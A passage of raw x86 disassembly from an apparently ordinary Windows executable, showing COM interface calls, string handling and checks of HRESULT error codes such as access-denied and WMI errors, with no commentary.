  406c90:	push   DWORD PTR [ebp+0x14]
  406c93:	push   eax
  406c94:	push   eax
  406c95:	jmp    0x406cb9
  406c97:	xor    eax,eax
  406c99:	xor    ecx,ecx
  406c9b:	inc    ecx
  406c9c:	cmp    DWORD PTR [ebp+0x18],eax
  406c9f:	jne    0x406ca5
  406ca1:	mov    eax,DWORD PTR [ebx]
  406ca3:	xor    ecx,ecx
  406ca5:	push   ecx
  406ca6:	push   DWORD PTR [ebp+0x20]
  406ca9:	lea    edx,[ebp-0x1c]
  406cac:	push   edx
  406cad:	push   0x401078
  406cb2:	push   ecx
  406cb3:	push   DWORD PTR [ebp+0x14]
  406cb6:	push   eax
  406cb7:	push   DWORD PTR [edi]
  406cb9:	push   DWORD PTR [ebp+0x8]
  406cbc:	mov    edx,esi
  406cbe:	mov    ecx,DWORD PTR [ebp-0x20]
  406cc1:	call   0x40670d
  406cc6:	mov    DWORD PTR [ebp-0x18],eax
  406cc9:	mov    esi,DWORD PTR [ebp-0x1c]
  406ccc:	push   esi
  406ccd:	call   DWORD PTR ds:0x412014
  406cd3:	cmp    DWORD PTR [ebp-0x18],0x1
  406cd7:	jne    0x406ceb
  406cd9:	or     DWORD PTR [ebp-0x4],0xffffffff
  406cdd:	lea    ecx,[ebp-0x14]
  406ce0:	call   DWORD PTR ds:0x4121c0
  406ce6:	xor    eax,eax
  406ce8:	inc    eax
  406ce9:	jmp    0x406d13
  406ceb:	mov    eax,0x80041064
  406cf0:	cmp    esi,eax
  406cf2:	je     0x406d1b
  406cf4:	mov    eax,0x80070005
  406cf9:	cmp    esi,eax
  406cfb:	je     0x406d1b
  406cfd:	mov    ecx,esi
  406cff:	call   0x407454
  406d04:	or     DWORD PTR [ebp-0x4],0xffffffff
  406d08:	lea    ecx,[ebp-0x14]
  406d0b:	call   DWORD PTR ds:0x4121c0
  406d11:	xor    eax,eax
  406d13:	call   0x40ea03
  406d18:	ret    0x24
  406d1b:	push   eax
  406d1c:	call   DWORD PTR ds:0x412014
  406d22:	cmp    DWORD PTR [ebp+0x18],0x0
  406d26:	je     0x406d04
  406d28:	mov    ecx,edi
  406d2a:	call   DWORD PTR ds:0x4121b8
  406d30:	mov    eax,DWORD PTR [eax+0x4]
  406d33:	test   eax,eax
  406d35:	jne    0x406d6b
  406d37:	and    DWORD PTR [ebp-0x1c],eax
  406d3a:	lea    eax,[ebp-0x1c]
  406d3d:	push   eax
  406d3e:	push   0x0
  406d40:	push   0x2
  406d42:	call   DWORD PTR ds:0x412130
  406d48:	push   DWORD PTR [ebp-0x1c]
  406d4b:	mov    ecx,edi
  406d4d:	call   DWORD PTR ds:0x4121c8
  406d53:	lea    ecx,[ebp-0x1c]
  406d56:	push   ecx
  406d57:	push   eax
  406d58:	push   0x2
  406d5a:	call   DWORD PTR ds:0x412130
  406d60:	test   al,al
  406d62:	jne    0x406d6b
  406d64:	call   0x4095c0
  406d69:	jmp    0x406d04
  406d6b:	push   0x100
  406d70:	mov    ecx,ebx
  406d72:	call   DWORD PTR ds:0x4121c8
  406d78:	mov    esi,eax
  406d7a:	push   DWORD PTR [edi]
  406d7c:	mov    ecx,0x157d
  406d81:	call   0x4098dc
  406d86:	push   eax
  406d87:	lea    eax,[ebp-0x14]
  406d8a:	push   eax
  406d8b:	call   DWORD PTR ds:0x4121b4
  406d91:	add    esp,0xc
  406d94:	lea    ecx,[ebp-0x14]
  406d97:	call   DWORD PTR ds:0x4121b8
  406d9d:	mov    eax,DWORD PTR [eax+0x4]
  406da0:	push   0x0
  406da2:	lea    ecx,[ebp-0x24]
  406da5:	push   ecx
  406da6:	push   eax
  406da7:	push   DWORD PTR [ebp-0x14]
  406daa:	push   0xfffffff5
  406dac:	call   DWORD PTR ds:0x41202c
  406db2:	push   eax
  406db3:	call   DWORD PTR ds:0x412020
  406db9:	mov    edx,0x100
  406dbe:	mov    ecx,esi
  406dc0:	call   0x40a7f3
  406dc5:	mov    DWORD PTR [ebp-0x18],eax
  406dc8:	cmp    eax,0x1
  406dcb:	jne    0x406d04
  406dd1:	push   0xffffffff
  406dd3:	mov    ecx,ebx
  406dd5:	call   DWORD PTR ds:0x4121dc
  406ddb:	push   ecx
  406ddc:	push   DWORD PTR [ebp+0x20]
  406ddf:	push   0x0
  406de1:	push   0x401078
  406de6:	push   0x0
  406de8:	push   DWORD PTR [ebp+0x14]
  406deb:	push   DWORD PTR [ebx]
  406ded:	push   DWORD PTR [edi]
  406def:	push   DWORD PTR [ebp+0x8]
  406df2:	mov    edx,DWORD PTR [ebp-0x28]
  406df5:	mov    ecx,DWORD PTR [ebp-0x20]
  406df8:	call   0x40670d
  406dfd:	mov    esi,eax
  406dff:	mov    DWORD PTR [ebp-0x18],esi
  406e02:	or     DWORD PTR [ebp-0x4],0xffffffff
  406e06:	lea    ecx,[ebp-0x14]
  406e09:	call   DWORD PTR ds:0x4121c0
  406e0f:	mov    eax,esi
  406e11:	jmp    0x406d13
  406e16:	mov    ecx,0x80041006
  406e1b:	call   0x407454
  406e20:	mov    eax,0x406d04
  406e25:	ret    
  406e26:	int3   
  406e27:	int3   
  406e28:	int3   
  406e29:	int3   
  406e2a:	int3   
  406e2b:	mov    edi,edi
  406e2d:	push   ebp
  406e2e:	mov    ebp,esp
  406e30:	sub    esp,0x14
  406e33:	mov    eax,ds:0x411004
  406e38:	xor    eax,ebp
  406e3a:	mov    DWORD PTR [ebp-0x4],eax
  406e3d:	xor    eax,eax
  406e3f:	mov    DWORD PTR [ebp-0x14],edx
  406e42:	push   edi
  406e43:	mov    edi,ecx
  406e45:	mov    DWORD PTR [ebp-0xc],eax
  406e48:	mov    DWORD PTR [ebp-0x10],eax
  406e4b:	mov    DWORD PTR [ebp-0x8],eax
  406e4e:	test   edi,edi
  406e50:	jne    0x406e59
  406e52:	mov    eax,0x80041008
  406e57:	jmp    0x406eca
  406e59:	push   ebx
  406e5a:	push   esi
  406e5b:	mov    esi,DWORD PTR [edi]
  406e5d:	lea    eax,[ebp-0x8]
  406e60:	push   eax
  406e61:	push   0x401bd8
  406e66:	push   edi
  406e67:	mov    ecx,DWORD PTR [esi]
  406e69:	call   DWORD PTR ds:0x41228c
  406e6f:	call   DWORD PTR [esi]
  406e71:	mov    ebx,eax
  406e73:	test   ebx,ebx
  406e75:	js     0x406ec6
  406e77:	mov    eax,DWORD PTR [ebp-0x8]
  406e7a:	xor    ecx,ecx
  406e7c:	push   ecx
  406e7d:	push   ecx
  406e7e:	push   ecx
  406e7f:	mov    esi,DWORD PTR [eax]
  406e81:	push   ecx
  406e82:	push   ecx
  406e83:	lea    ecx,[ebp-0x10]
  406e86:	push   ecx
  406e87:	lea    ecx,[ebp-0xc]
  406e8a:	push   ecx
  406e8b:	mov    ecx,DWORD PTR [esi+0xc]
  406e8e:	push   edi
  406e8f:	push   eax
  406e90:	call   DWORD PTR ds:0x41228c
  406e96:	call   DWORD PTR [esi+0xc]
  406e99:	mov    ebx,eax
  406e9b:	test   ebx,ebx
  406e9d:	js     0x406eaf
  406e9f:	mov    ecx,DWORD PTR [ebp+0x8]
  406ea2:	mov    eax,DWORD PTR [ebp-0xc]
  406ea5:	mov    DWORD PTR [ecx],eax
  406ea7:	mov    ecx,DWORD PTR [ebp-0x14]
  406eaa:	mov    eax,DWORD PTR [ebp-0x10]
  406ead:	mov    DWORD PTR [ecx],eax
  406eaf:	mov    ecx,DWORD PTR [ebp-0x8]
  406eb2:	test   ecx,ecx
  406eb4:	je     0x406ec6
  406eb6:	mov    eax,DWORD PTR [ecx]
  406eb8:	push   ecx
  406eb9:	mov    esi,DWORD PTR [eax+0x8]
  406ebc:	mov    ecx,esi
  406ebe:	call   DWORD PTR ds:0x41228c
  406ec4:	call   esi
  406ec6:	pop    esi
  406ec7:	mov    eax,ebx
  406ec9:	pop    ebx
  406eca:	mov    ecx,DWORD PTR [ebp-0x4]
  406ecd:	xor    ecx,ebp
  406ecf:	pop    edi
  406ed0:	call   0x40e2c0
  406ed5:	mov    esp,ebp
  406ed7:	pop    ebp
  406ed8:	ret    0x4
  406edb:	int3   
  406edc:	int3   
  406edd:	int3   
  406ede:	int3   
  406edf:	int3   
  406ee0:	push   0x1c
  406ee2:	mov    eax,0x40f397
  406ee7:	call   0x40eab7
  406eec:	mov    edi,edx
  406eee:	mov    DWORD PTR [ebp-0x24],edi
  406ef1:	mov    esi,ecx
  406ef3:	lea    ecx,[ebp-0x14]
  406ef6:	call   DWORD PTR ds:0x4121c4
  406efc:	xor    ebx,ebx
  406efe:	mov    DWORD PTR [ebp-0x4],ebx
  406f01:	lea    ecx,[ebp-0x18]
  406f04:	call   DWORD PTR ds:0x4121c4
  406f0a:	mov    BYTE PTR [ebp-0x4],0x1
  406f0e:	mov    DWORD PTR [ebp-0x20],ebx
  406f11:	mov    BYTE PTR [ebp-0x4],0x2
  406f15:	test   esi,esi
  406f17:	jne    0x406f3c
  406f19:	mov    BYTE PTR [ebp-0x4],bl
  406f1c:	lea    ecx,[ebp-0x18]
  406f1f:	call   DWORD PTR ds:0x4121c0
  406f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  406f29:	lea    ecx,[ebp-0x14]
  406f2c:	call   DWORD PTR ds:0x4121c0
  406f32:	mov    eax,0x80041008
  406f37:	jmp    0x4070bb
  406f3c:	mov    eax,DWORD PTR [ebp+0xc]
  406f3f:	mov    edx,DWORD PTR [eax]
  406f41:	test   edx,edx
  406f43:	je     0x406f53
  406f45:	mov    ecx,esi
  406f47:	call   0x4070c8
  406f4c:	mov    esi,eax
  406f4e:	jmp    0x4070a0
  406f53:	test   edi,edi
  406f55:	mov    edi,DWORD PTR [ebp+0x8]
  406f58:	jne    0x406f78
  406f5a:	test   edi,edi
  406f5c:	jne    0x406f78
  406f5e:	push   ecx
  406f5f:	push   ebx
  406f60:	sub    esp,0xc
  406f63:	push   ebx
  406f64:	push   0xa
  406f66:	pop    edx
  406f67:	mov    ecx,esi
  406f69:	call   0x407118
  406f6e:	mov    esi,eax
  406f70:	mov    DWORD PTR [ebp-0x1c],esi
  406f73:	jmp    0x4070a0
  406f78:	push   0x40188c
  406f7d:	lea    ecx,[ebp-0x18]
  406f80:	call   DWORD PTR ds:0x4121b0
  406f86:	push   DWORD PTR [ebp-0x24]
  406f89:	lea    ecx,[ebp-0x14]
  406f8c:	call   DWORD PTR ds:0x4121b0
  406f92:	push   0x5c
  406f94:	lea    ecx,[ebp-0x14]
  406f97:	call   DWORD PTR ds:0x4121cc
  406f9d:	mov    DWORD PTR [ebp-0x28],eax
  406fa0:	lea    ecx,[ebp-0x14]
  406fa3:	cmp    eax,0xffffffff
  406fa6:	je     0x406ffd
  406fa8:	push   eax
  406fa9:	lea    eax,[ebp-0x24]
  406fac:	push   eax
  406fad:	call   DWORD PTR ds:0x41219c
  406fb3:	mov    BYTE PTR [ebp-0x4],0x3
  406fb7:	push   eax
  406fb8:	lea    ecx,[ebp-0x18]
  406fbb:	call   DWORD PTR ds:0x4121bc
  406fc1:	mov    BYTE PTR [ebp-0x4],0x2
  406fc5:	lea    ecx,[ebp-0x24]
  406fc8:	call   DWORD PTR ds:0x4121c0
  406fce:	mov    eax,DWORD PTR [ebp-0x28]
  406fd1:	inc    eax
  406fd2:	push   eax
  406fd3:	lea    eax,[ebp-0x28]
  406fd6:	push   eax
  406fd7:	lea    ecx,[ebp-0x14]
  406fda:	call   DWORD PTR ds:0x4121ac
  406fe0:	mov    BYTE PTR [ebp-0x4],0x4
  406fe4:	push   eax
  406fe5:	lea    ecx,[ebp-0x14]
  406fe8:	call   DWORD PTR ds:0x4121bc
  406fee:	mov    BYTE PTR [ebp-0x4],0x2
  406ff2:	lea    ecx,[ebp-0x28]
  406ff5:	call   DWORD PTR ds:0x4121c0
  406ffb:	jmp    0x407005
  406ffd:	push   0x40
  406fff:	call   DWORD PTR ds:0x4121cc
  407005:	lea    ecx,[ebp-0x18]
  407008:	call   DWORD PTR ds:0x4121b8
  40700e:	mov    eax,DWORD PTR [eax+0x4]
  407011:	test   eax,eax
  407013:	je     0x40701b
  407015:	mov    eax,DWORD PTR [ebp-0x18]
  407018:	mov    DWORD PTR [ebp-0x20],eax
  40701b:	lea    ecx,[ebp-0x14]
  40701e:	call   DWORD PTR ds:0x4121b8
  407024:	mov    eax,DWORD PTR [eax+0x4]
  407027:	test   eax,eax
  407029:	mov    eax,DWORD PTR [ebp-0x14]
  40702c:	jne    0x407030
  40702e:	mov    eax,ebx
  407030:	push   DWORD PTR [ebp+0xc]
  407033:	push   DWORD PTR [ebp-0x20]
  407036:	mov    edx,edi
  407038:	mov    ecx,eax
  40703a:	call   0x4072ae
  40703f:	mov    edi,eax
  407041:	mov    DWORD PTR [ebp-0x1c],edi
  407044:	test   edi,edi
  407046:	jns    0x407065
  407048:	mov    BYTE PTR [ebp-0x4],bl
  40704b:	lea    ecx,[ebp-0x18]
  40704e:	call   DWORD PTR ds:0x4121c0
  407054:	or     DWORD PTR [ebp-0x4],0xffffffff
  407058:	lea    ecx,[ebp-0x14]
  40705b:	call   DWORD PTR ds:0x4121c0
  407061:	mov    eax,edi
  407063:	jmp    0x4070bb
  407065:	push   ecx
  407066:	mov    eax,DWORD PTR [ebp+0xc]
  407069:	push   DWORD PTR [eax]
  40706b:	sub    esp,0xc
  40706e:	push   ebx
  40706f:	push   0xa
  407071:	pop    edx
  407072:	mov    ecx,esi
  407074:	call   0x407118
  407079:	mov    esi,eax
  40707b:	mov    DWORD PTR [ebp-0x1c],esi
  40707e:	mov    DWORD PTR [ebp-0x4],0x1
  407085:	jmp    0x4070a0
  407087:	mov    DWORD PTR [ebp-0x1c],0x80041006
  40708e:	mov    eax,0x407094
  407093:	ret    
  407094:	mov    DWORD PTR [ebp-0x4],0x1
  40709b:	xor    ebx,ebx
  40709d:	mov    esi,DWORD PTR [ebp-0x1c]
  4070a0:	mov    BYTE PTR [ebp-0x4],bl
  4070a3:	lea    ecx,[ebp-0x18]
  4070a6:	call   DWORD PTR ds:0x4121c0
  4070ac:	or     DWORD PTR [ebp-0x4],0xffffffff
  4070b0:	lea    ecx,[ebp-0x14]
  4070b3:	call   DWORD PTR ds:0x4121c0
  4070b9:	mov    eax,esi
  4070bb:	call   0x40ea03
  4070c0:	ret    0x8
  4070c3:	int3   
  4070c4:	int3   
  4070c5:	int3   
  4070c6:	int3   
  4070c7:	int3   
  4070c8:	mov    edi,edi
  4070ca:	push   ebp
  4070cb:	mov    ebp,esp
  4070cd:	push   ecx
  4070ce:	push   ecx
  4070cf:	and    DWORD PTR [ebp-0x4],0x0
  4070d3:	push   esi
  4070d4:	mov    esi,ecx
  4070d6:	mov    DWORD PTR [ebp-0x8],0xa
  4070dd:	push   edi
  4070de:	mov    edi,edx
  4070e0:	test   esi,esi
  4070e2:	jne    0x4070eb
  4070e4:	mov    eax,0x80041008
  4070e9:	jmp    0x40710d
  4070eb:	lea    eax,[ebp-0x8]
  4070ee:	push   eax
  4070ef:	lea    edx,[ebp-0x4]
  4070f2:	call   0x406e2b
  4070f7:	test   eax,eax
  4070f9:	js     0x40710d
  4070fb:	mov    edx,DWORD PTR [ebp-0x8]
  4070fe:	push   ecx
  4070ff:	push   edi
  407100:	sub    esp,0xc
  407103:	mov    ecx,esi
  407105:	push   DWORD PTR [ebp-0x4]
  407108:	call   0x407118
  40710d:	pop    edi
  40710e:	pop    esi
  40710f:	mov    esp,ebp
  407111:	pop    ebp
  407112:	ret    
  407113:	int3   
  407114:	int3   
  407115:	int3   
  407116:	int3   
  407117:	int3   
  407118:	mov    edi,edi
  40711a:	push   ebp
  40711b:	mov    ebp,esp
  40711d:	sub    esp,0x10
  407120:	mov    eax,ds:0x411004
  407125:	xor    eax,ebp
  407127:	mov    DWORD PTR [ebp-0x4],eax
  40712a:	and    DWORD PTR [ebp-0xc],0x0
  40712e:	and    DWORD PTR [ebp-0x8],0x0
  407132:	push   ebx
  407133:	push   esi
  407134:	push   edi
  407135:	mov    edi,ecx
  407137:	mov    DWORD PTR [ebp-0x10],edx
  40713a:	test   edi,edi
  40713c:	je     0x407291
  407142:	mov    esi,DWORD PTR [edi]
  407144:	lea    eax,[ebp-0xc]
  407147:	push   eax
  407148:	push   0x401be8
  40714d:	push   edi
  40714e:	mov    ecx,DWORD PTR [esi]
  407150:	call   DWORD PTR ds:0x41228c
  407156:	call   DWORD PTR [esi]
  407158:	test   eax,eax
  40715a:	js     0x407296
  407160:	mov    esi,DWORD PTR [edi]
  407162:	lea    eax,[ebp-0x8]
  407165:	push   eax
  407166:	push   0x401bd8
  40716b:	push   edi
  40716c:	mov    ecx,DWORD PTR [esi]
  40716e:	call   DWORD PTR ds:0x41228c
  407174:	call   DWORD PTR [esi]
  407176:	mov    ebx,eax
  407178:	test   ebx,ebx
  40717a:	jns    0x40719a
  40717c:	mov    edx,DWORD PTR [ebp-0xc]
  40717f:	test   edx,edx
  407181:	je     0x407193
  407183:	mov    ecx,DWORD PTR [edx]
  407185:	push   edx
  407186:	mov    esi,DWORD PTR [ecx+0x8]
  407189:	mov    ecx,esi
  40718b:	call   DWORD PTR ds:0x41228c
  407191:	call   esi
  407193:	mov    eax,ebx
  407195:	jmp    0x407296
  40719a:	mov    ebx,DWORD PTR [ebp+0x18]
  40719d:	mov    eax,DWORD PTR [ebp-0x8]
  4071a0:	push   0x0
  4071a2:	push   ebx
  4071a3:	push   0x3
  4071a5:	mov    esi,DWORD PTR [eax]
  4071a7:	push   0x6
  4071a9:	push   0x0
  4071ab:	push   DWORD PTR [ebp+0x8]
  4071ae:	mov    ecx,DWORD PTR [esi+0x10]
  4071b1:	push   DWORD PTR [ebp-0x10]
  4071b4:	push   edi
  4071b5:	push   eax
  4071b6:	call   DWORD PTR ds:0x41228c
  4071bc:	call   DWORD PTR [esi+0x10]
  4071bf:	mov    edi,eax
  4071c1:	test   edi,edi
  4071c3:	jns    0x4071fe
  4071c5:	mov    eax,DWORD PTR [ebp-0xc]
  4071c8:	test   eax,eax
  4071ca:	je     0x4071e0
  4071cc:	mov    ecx,DWORD PTR [eax]
  4071ce:	push   eax
  4071cf:	mov    esi,DWORD PTR [ecx+0x8]
  4071d2:	mov    ecx,esi
  4071d4:	call   DWORD PTR ds:0x41228c
  4071da:	call   esi
  4071dc:	and    DWORD PTR [ebp-0xc],0x0
  4071e0:	mov    ecx,DWORD PTR [ebp-0x8]
  4071e3:	test   ecx,ecx
  4071e5:	je     0x4071f7
  4071e7:	mov    eax,DWORD PTR [ecx]
  4071e9:	push   ecx
  4071ea:	mov    esi,DWORD PTR [eax+0x8]
  4071ed:	mov    ecx,esi
  4071ef:	call   DWORD PTR ds:0x41228c
  4071f5:	call   esi
  4071f7:	mov    eax,edi
  4071f9:	jmp    0x407296
  4071fe:	mov    ecx,DWORD PTR [ebp-0x8]
  407201:	test   ecx,ecx
  407203:	je     0x407219
  407205:	mov    eax,DWORD PTR [ecx]
  407207:	push   ecx
  407208:	mov    esi,DWORD PTR [eax+0x8]
  40720b:	mov    ecx,esi
  40720d:	call   DWORD PTR ds:0x41228c
  407213:	call   esi
  407215:	and    DWORD PTR [ebp-0x8],0x0
  407219:	test   ebx,ebx
  40721b:	je     0x407289
  40721d:	mov    eax,DWORD PTR [ebp-0xc]
  407220:	lea    ecx,[ebp-0x8]
  407223:	push   ecx
  407224:	push   0x401bd8
  407229:	push   eax
  40722a:	mov    esi,DWORD PTR [eax]
  40722c:	mov    ecx,DWORD PTR [esi]
  40722e:	call   DWORD PTR ds:0x41228c
  407234:	call   DWORD PTR [esi]
  407236:	test   eax,eax
  407238:	js     0x40727d
  40723a:	mov    eax,DWORD PTR [ebp-0x8]
  40723d:	push   0x0
  40723f:	push   ebx
  407240:	push   0x3
  407242:	mov    esi,DWORD PTR [eax]
  407244:	push   0x6
  407246:	push   0x0
  407248:	push   DWORD PTR [ebp+0x8]
  40724b:	mov    ecx,DWORD PTR [esi+0x10]
  40724e:	push   DWORD PTR [ebp-0x10]
  407251:	push   DWORD PTR [ebp-0xc]
  407254:	push   eax
  407255:	call   DWORD PTR ds:0x41228c
  40725b:	call   DWORD PTR [esi+0x10]
  40725e:	mov    ecx,DWORD PTR [ebp-0x8]
  407261:	mov    edi,eax
  407263:	test   ecx,ecx
  407265:	je     0x407289
  407267:	mov    eax,DWORD PTR [ecx]
  407269:	push   ecx
  40726a:	mov    esi,DWORD PTR [eax+0x8]
  40726d:	mov    ecx,esi
  40726f:	call   DWORD PTR ds:0x41228c
  407275:	call   esi
  407277:	and    DWORD PTR [ebp-0x8],0x0
  40727b:	jmp    0x407289
  40727d:	lea    edi,[eax+0x7fffbffe]
  407283:	neg    edi
  407285:	sbb    edi,edi
  407287:	and    edi,eax
  407289:	mov    ecx,DWORD PTR [ebp-0xc]
  40728c:	jmp    0x4071e3
  407291:	mov    eax,0x80041008
  407296:	mov    ecx,DWORD PTR [ebp-0x4]
  407299:	pop    edi
  40729a:	pop    esi
  40729b:	xor    ecx,ebp
  40729d:	pop    ebx
  40729e:	call   0x40e2c0
  4072a3:	mov    esp,ebp
  4072a5:	pop    ebp
  4072a6:	ret    0x18
  4072a9:	int3   
  4072aa:	int3   
  4072ab:	int3   
  4072ac:	int3   
  4072ad:	int3   
  4072ae:	mov    edi,edi
  4072b0:	push   ebp
  4072b1:	mov    ebp,esp
  4072b3:	sub    esp,0xc
  4072b6:	and    DWORD PTR [ebp-0x4],0x0
  4072ba:	cmp    DWORD PTR [ebp+0xc],0x0
  4072be:	push   ebx
  4072bf:	push   esi
  4072c0:	push   edi
  4072c1:	mov    DWORD PTR [ebp-0xc],edx
  4072c4:	mov    ebx,ecx
  4072c6:	jne    0x4072d2
  4072c8:	mov    eax,0x80041008
  4072cd:	jmp    0x4073e3
  4072d2:	push   0x1c
  4072d4:	pop    edi
  4072d5:	push   edi
  4072d6:	call   DWORD PTR ds:0x412174
  4072dc:	mov    esi,eax
  4072de:	mov    DWORD PTR [ebp-0x8],esi
  4072e1:	test   esi,esi
  4072e3:	jne    0x4072ef
  4072e5:	mov    eax,0x80041006
  4072ea:	jmp    0x4073e3
  4072ef:	mov    BYTE PTR [eax],0x0
  4072f2:	inc    eax
  4072f3:	sub    edi,0x1
  4072f6:	jne    0x4072ef
  4072f8:	test   ebx,ebx
  4072fa:	je     0x407346
  4072fc:	mov    ecx,ebx
  4072fe:	call   0x40a30b
  407303:	mov    edi,eax
  407305:	lea    eax,[edi+0x1]
  407308:	cmp    eax,edi
  40730a:	jb     0x4073ec
  407310:	lea    ecx,[ebp-0x4]
  407313:	push   ecx
  407314:	mov    ecx,eax
  407316:	call   0x4089ff
  40731b:	test   eax,eax
  40731d:	js     0x4073ec
  407323:	push   DWORD PTR [ebp-0x4]
  407326:	call   DWORD PTR ds:0x412174
  40732c:	mov    DWORD PTR [esi],eax
  40732e:	test   eax,eax
  407330:	je     0x4073ec
  407336:	lea    eax,[edi+0x1]
  407339:	mov    DWORD PTR [esi+0x4],edi
  40733c:	mov    ecx,DWORD PTR [esi]
  40733e:	mov    edx,ebx
  407340:	push   eax
  407341:	call   0x40a26c
  407346:	mov    edi,DWORD PTR [ebp+0x8]
  407349:	test   edi,edi
  40734b:	je     0x407391
  40734d:	mov    ecx,edi
  40734f:	call   0x40a30b
  407354:	mov    ebx,eax
  407356:	lea    eax,[ebx+0x1]
  407359:	cmp    eax,ebx
  40735b:	jb     0x4073ec
  407361:	lea    ecx,[ebp-0x4]
  407364:	push   ecx
  407365:	mov    ecx,eax
  407367:	call   0x4089ff
  40736c:	test   eax,eax
  40736e:	js     0x4073ec
  407370:	push   DWORD PTR [ebp-0x4]
  407373:	call   DWORD PTR ds:0x412174
  407379:	mov    DWORD PTR [esi+0x8],eax
  40737c:	test   eax,eax
  40737e:	je     0x4073ec
  407380:	lea    eax,[ebx+0x1]
  407383:	mov    DWORD PTR [esi+0xc],ebx
  407386:	mov    ecx,DWORD PTR [esi+0x8]
  407389:	mov    edx,edi
  40738b:	push   eax
  40738c:	call   0x40a26c
  407391:	mov    eax,DWORD PTR [ebp-0xc]
  407394:	test   eax,eax
  407396:	je     0x4073d5
  407398:	mov    ecx,eax
  40739a:	call   0x40a30b
  40739f:	mov    edi,eax
  4073a1:	lea    ebx,[edi+0x1]
  4073a4:	cmp    ebx,edi
  4073a6:	jb     0x4073ec
  4073a8:	lea    eax,[ebp-0x4]
  4073ab:	mov    ecx,ebx
  4073ad:	push   eax
  4073ae:	call   0x4089ff
  4073b3:	test   eax,eax
  4073b5:	js     0x4073ec
  4073b7:	push   DWORD PTR [ebp-0x4]
  4073ba:	call   DWORD PTR ds:0x412174
  4073c0:	mov    DWORD PTR [esi+0x10],eax
  4073c3:	test   eax,eax
  4073c5:	je     0x4073ec
  4073c7:	mov    edx,DWORD PTR [ebp-0xc]
  4073ca:	mov    ecx,eax
  4073cc:	push   ebx
  4073cd:	mov    DWORD PTR [esi+0x14],edi
  4073d0:	call   0x40a26c
  4073d5:	mov    eax,DWORD PTR [ebp+0xc]
  4073d8:	mov    DWORD PTR [esi+0x18],0x2
  4073df:	mov    DWORD PTR [eax],esi
  4073e1:	xor    eax,eax
  4073e3:	pop    edi
  4073e4:	pop    esi
  4073e5:	pop    ebx
  4073e6:	mov    esp,ebp
  4073e8:	pop    ebp
  4073e9:	ret    0x8
  4073ec:	lea    ecx,[ebp-0x8]
  4073ef:	call   0x4073fe
  4073f4:	jmp    0x4072e5
  4073f9:	int3   
  4073fa:	int3   
  4073fb:	int3   
  4073fc:	int3   
  4073fd:	int3   
  4073fe:	mov    edi,edi
  407400:	push   esi
  407401:	mov    esi,ecx
  407403:	mov    eax,DWORD PTR [esi]
  407405:	test   eax,eax
  407407:	je     0x40744d
  407409:	mov    ecx,DWORD PTR [eax]
  40740b:	push   edi
  40740c:	xor    edi,edi
  40740e:	test   ecx,ecx
  407410:	je     0x40741d
  407412:	push   ecx
  407413:	call   DWORD PTR ds:0x412188
  407419:	mov    eax,DWORD PTR [esi]
  40741b:	mov    DWORD PTR [eax],edi
  40741d:	mov    ecx,DWORD PTR [eax+0x10]
  407420:	test   ecx,ecx
  407422:	je     0x407430
  407424:	push   ecx
  407425:	call   DWORD PTR ds:0x412188
  40742b:	mov    eax,DWORD PTR [esi]
  40742d:	mov    DWORD PTR [eax+0x10],edi
  407430:	mov    ecx,DWORD PTR [eax+0x8]
  407433:	test   ecx,ecx
  407435:	je     0x407443
  407437:	push   ecx
  407438:	call   DWORD PTR ds:0x412188
  40743e:	mov    eax,DWORD PTR [esi]
  407440:	mov    DWORD PTR [eax+0x8],edi
  407443:	push   eax
  407444:	call   DWORD PTR ds:0x412188
  40744a:	mov    DWORD PTR [esi],edi
  40744c:	pop    edi
  40744d:	pop    esi
  40744e:	ret    
  40744f:	int3   
  407450:	int3   
  407451:	int3   
  407452:	int3   
  407453:	int3   
  407454:	push   0x20
  407456:	mov    eax,0x40f3cf
  40745b:	call   0x40eaf2
  407460:	mov    edi,ecx
  407462:	mov    DWORD PTR [ebp-0x1c],edi
  407465:	xor    ebx,ebx
  407467:	mov    DWORD PTR [ebp-0x28],ebx
  40746a:	mov    esi,ebx
  40746c:	mov    DWORD PTR [ebp-0x18],esi
  40746f:	mov    DWORD PTR [ebp-0x4],ebx
  407472:	mov    BYTE PTR [ebp-0x4],0x1
  407476:	cmp    edi,0x80070005
  40747c:	jne    0x407486
  40747e:	mov    edi,0x52e
  407483:	mov    DWORD PTR [ebp-0x1c],edi
  407486:	cmp    edi,0x80040154
  40748c:	jne    0x4074e9
  40748e:	mov    ecx,0x1580
  407493:	call   0x4098dc
  407498:	push   eax
  407499:	lea    ecx,[ebp-0x1c]
  40749c:	call   0x40594b
  4074a1:	mov    esi,eax
  4074a3:	mov    BYTE PTR [ebp-0x4],0x2
  4074a7:	mov    ecx,DWORD PTR [esi]
  4074a9:	test   ecx,ecx
  4074ab:	je     0x4074b1
  4074ad:	lock inc DWORD PTR [ecx+0x8]
  4074b1:	lea    ecx,[ebp-0x18]
  4074b4:	call   0x4058ac
  4074b9:	mov    esi,DWORD PTR [esi]
  4074bb:	mov    DWORD PTR [ebp-0x18],esi
  4074be:	mov    BYTE PTR [ebp-0x4],0x1
  4074c2:	lea    ecx,[ebp-0x1c]
  4074c5:	call   0x4058ac
  4074ca:	test   esi,esi
  4074cc:	je     0x4074d0
  4074ce:	mov    ebx,DWORD PTR [esi]
  4074d0:	mov    ecx,ebx
  4074d2:	call   0x4094c8
  4074d7:	or     DWORD PTR [ebp-0x4],0xffffffff
  4074db:	lea    ecx,[ebp-0x18]
  4074de:	call   0x4058ac
  4074e3:	call   0x40ea30
  4074e8:	ret    
  4074e9:	lea    eax,[ebp-0x28]
  4074ec:	push   eax
  4074ed:	push   0x401c08
  4074f2:	push   0x1
  4074f4:	push   ebx
  4074f5:	push   0x401bf8
  4074fa:	call   DWORD PTR ds:0x412178
  407500:	test   eax,eax
  407502:	js     0x40757b
  407504:	mov    DWORD PTR [ebp-0x20],ebx
  407507:	mov    eax,DWORD PTR [ebp-0x28]
  40750a:	mov    edi,DWORD PTR [eax]
  40750c:	lea    ecx,[ebp-0x20]
  40750f:	push   ecx
  407510:	push   ebx
  407511:	push   ebx
  407512:	push   DWORD PTR [ebp-0x1c]
  407515:	push   eax
  407516:	mov    ecx,DWORD PTR [edi+0xc]
  407519:	call   DWORD PTR ds:0x41228c
  40751f:	call   DWORD PTR [edi+0xc]
  407522:	mov    edi,eax
  407524:	cmp    DWORD PTR [ebp-0x20],0x0
  407528:	je     0x407567
  40752a:	push   DWORD PTR [ebp-0x20]
  40752d:	lea    ecx,[ebp-0x24]
  407530:	call   0x40594b
  407535:	mov    esi,eax
  407537:	mov    BYTE PTR [ebp-0x4],0x3
  40753b:	mov    ecx,DWORD PTR [esi]
